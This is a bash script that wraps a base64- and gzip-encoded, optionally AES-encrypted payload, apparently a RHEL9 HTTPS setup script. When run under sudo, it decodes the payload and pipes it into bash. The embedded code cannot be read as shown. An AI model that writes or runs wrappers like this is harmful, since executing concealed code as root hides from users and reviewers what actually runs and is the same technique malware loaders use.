#!/usr/bin/env bash
# Self-decoding installer wrapper
# - Contains base64(+gzip) payload, optionally AES-256-CBC encrypted
# - Decodes, optionally decrypts, ungzips, then execs payload under bash
#
# Runtime:
#   sudo bash ./THIS_SCRIPT.sh
#
set -euo pipefail

need() {
  command -v "$1" >/dev/null 2>&1
}

dec_b64() {
  # Decode base64 from stdin to stdout using available tools
  if need base64; then base64 -d 2>/dev/null || base64 --decode; return; fi
  if need openssl; then openssl base64 -d; return; fi
  if need python3; then python3 - <<'PY'
import sys, base64
sys.stdout.buffer.write(base64.b64decode(sys.stdin.buffer.read()))
PY
  return; fi
  if need python; then python - <<'PY'
import sys, base64
sys.stdout.write(base64.b64decode(sys.stdin.read()))
PY
  return; fi
  if need perl; then perl -MMIME::Base64 -ne 'print decode_base64($_)'; return; fi
  if need busybox; then busybox base64 -d; return; fi
  echo "No base64 decoder found." >&2
  exit 1
}

dec_gzip() {
  # Decompress gzip from stdin to stdout
  if need gzip; then gzip -dc; return; fi
  if need busybox; then busybox gzip -dc; return; fi

  # Python/zlib fallback
  if need python3; then python3 - <<'PY'
import sys, zlib
sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read(), 16+zlib.MAX_WBITS))
PY
  return; fi
  if need python; then python - <<'PY'
import sys, zlib
sys.stdout.write(zlib.decompress(sys.stdin.read(), 16+zlib.MAX_WBITS))
PY
  return; fi

  echo "No gzip decompressor found." >&2
  exit 1
}

dec_aes() {
  # Decrypt AES-256-CBC with OpenSSL from stdin to stdout using OBF_PASSPHRASE
  if ! need openssl; then
    echo "OpenSSL not available for AES decryption." >&2
    exit 1
  fi
  pass="${OBF_PASSPHRASE:-}"
  if [ -z "$pass" ]; then
    printf "Enter passphrase: " >&2
    stty -echo 2>/dev/null || true
    IFS= read -r pass || true
    stty echo 2>/dev/null || true
    echo >&2
  fi
  # pbkdf2 here must match obfuscator mode
  OPENSSL_PASS="pass:$pass" exec openssl enc -d -aes-256-cbc -pbkdf2 -pass "$OPENSSL_PASS"
}

# Metadata injected below
OBF_ENCRYPTED="0"

# Payload markers
PAYLOAD_B64_START="__OBF_B64_PAYLOAD_START__"
PAYLOAD_B64_END="__OBF_B64_PAYLOAD_END__"

extract_payload() {
  # Pull only the lines between markers
  awk "/$PAYLOAD_B64_START/{flag=1;next}/$PAYLOAD_B64_END/{flag=0}flag" "$0"
}

run_payload() {
  # Decode pipeline:
  #   base64 -> (optional AES decrypt) -> gunzip -> bash -s --
  #
  # NOTE: we FORCE bash here. That fixes 'set -o pipefail' problems
  #       in the original installer script.
  if [ "$OBF_ENCRYPTED" = "1" ]; then
    extract_payload | dec_b64 | dec_aes | dec_gzip | /usr/bin/env bash -s -- "$@"
  else
    extract_payload | dec_b64 | dec_gzip | /usr/bin/env bash -s -- "$@"
  fi
}

run_payload "$@"
exit 0

__OBF_B64_PAYLOAD_START__
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
PJVxc8OLPsiHw487Rq1QLnIcN/4D0z+5P3QoAAA=
__OBF_B64_PAYLOAD_END__
